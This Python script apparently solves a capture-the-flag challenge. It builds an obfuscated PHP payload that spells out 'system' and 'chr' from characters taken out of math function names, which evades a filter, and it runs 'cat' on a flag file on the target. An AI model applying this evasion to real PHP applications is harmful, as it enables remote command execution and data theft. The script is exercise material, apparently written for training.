#!/usr/bin/python3

system = "(sin[0].hypot[1].sin[0].tan[0].exp[0].min[0])"
phpinfo = "(hypot[2].hypot[0].hypot[2].min[1].min[2].floor[0].floor[2])()"
cat = "cos[0].tan[1].tan[0]"
flag = "fmod[0].log[0].abs[0].log[2]"
chr_s = "(cos[0].tanh[3].ncr[2])"

abcdef = ["abs[0]", "abs[1]", "cos[0]", "rand[3]", "exp[0]", "fmod[0]"]

def ret_c(c):
	return chr_s+"("+str(ord(c))+")"

def ret_s(s):
	ret = ""
	for c in s:
		if c >= "a" and c <= "f":
			ret += abcdef[ord(c)-ord("a")] + "."
		else:
			#ret += "(" + ret_c(c) + ")."
			ret += ret_c(c) + "."
	return ret[:-1]
#cmd = "ls /"
cmd = "cat /flag_a2647e5eb8e9e767fe298aa012a49b50"

print(system+"("+ret_s(cmd)+")")

